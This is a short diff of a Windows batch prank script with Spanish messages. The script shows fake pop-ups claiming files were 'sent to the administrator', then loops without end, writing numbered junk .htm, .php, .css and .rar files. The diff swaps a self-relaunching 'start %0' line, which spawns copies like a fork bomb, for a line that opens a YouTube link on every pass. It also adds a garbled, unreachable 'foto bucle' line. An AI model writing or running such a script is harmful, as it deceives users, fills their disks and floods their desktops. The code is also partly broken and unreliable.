@@ -7,6 +7,7 @@ msg * espere un momento..
 msg * espere un momento...
 msg * los archivos han sido enviados al administrador correctamente
 set hoal = 1
+:bucle
 :menu
 cls
 set /a hoal = %hoal% + 1
@@ -34,8 +35,9 @@ echo xd>>%hoal%.htm
 echo xd>>%hoal%.php
 echo xd>>%hoal%.css
 echo xd>>%hoal%.rar
-start %0
+start https://youtu.be/uvXYYFO7h0Q
 goto menu
+foto bucle
 cls
 echo off
 timeout /T 1 /nobreak
